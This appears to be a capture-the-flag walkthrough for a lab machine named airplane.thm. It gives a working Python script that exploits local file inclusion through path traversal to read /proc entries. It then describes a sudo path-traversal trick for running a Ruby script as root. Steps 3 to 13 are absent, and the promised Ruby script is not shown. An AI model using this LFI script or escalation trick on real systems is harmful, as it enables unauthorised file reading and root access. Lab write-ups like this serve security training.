Phase 1: Initial Enumeration & LFI Exploitation

Step 1: Discovering the LFI Vulnerability

The web application running on port 8000 has a Local File Inclusion vulnerability that allows reading system files through the page parameter.

Step 2: Creating the Exploitation Script

Create a Python script to automate LFI exploitation and enumerate running processes:

import requests

def read_file(base_url, path):
    file_url = f"{base_url}/?page=../../../../{path}"
    try:
        response = requests.get(file_url)
        if response.status_code == 200:
            return response.text
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None

def find_pid_by_port(base_url, port):
    for pid in range(1, 5000):
        cmdline = read_file(base_url, f"proc/{pid}/cmdline")
        if cmdline and str(port) in cmdline:
            return pid
    return None

base_url = 'http://airplane.thm:8000'
port = '6048'

pid = find_pid_by_port(base_url, port)

if pid:
    cmdline = read_file(base_url, f"proc/{pid}/cmdline")
    print(f'PID: {pid}')
    print(f'Command: {cmdline}')
else:
    print('No process found')

Step 14: Creating Malicious Ruby Script

Create a Ruby script that spawns a root shell:

Step 15: Path Traversal Exploitation

Exploit the sudo rule using path traversal to execute our script in /tmp:

üí° How it works:
  • /root/../tmp/final.rb resolves to /tmp/final.rb
  • Sudo sees it as matching the pattern /root/*.rb
  • The Ruby exec function spawns a root shell
